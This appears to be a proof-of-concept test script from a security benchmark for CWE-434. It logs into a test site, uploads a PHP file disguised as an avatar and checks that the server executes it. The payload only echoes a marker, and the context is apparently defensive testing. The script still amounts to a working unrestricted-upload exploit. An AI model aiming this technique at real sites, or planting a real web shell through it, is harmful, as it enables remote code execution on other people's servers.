#!/usr/bin/env bash
# UPLOAD-001 (CWE-434): the avatar upload trusts the client filename and stores
# under the web root, so a .php file becomes an executable script.
set -eu
. "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
RAND="$RANDOM$RANDOM"
TMP="$(mktemp)"; mv "$TMP" "$TMP.php"; TMP="$TMP.php"
printf '%s' "<?php echo \"RCE-OK-$RAND\"; ?>" > "$TMP"
curl -s -c "$JAR" -b "$JAR" -X POST "$TARGET/profile/avatar" \
  -F "_token=$TOKEN" -F "avatar=@$TMP;filename=shell_$RAND.php" >/dev/null
rm -f "$TMP"
curl -s "$TARGET/uploads/shell_$RAND.php" | grep -q "RCE-OK-$RAND"
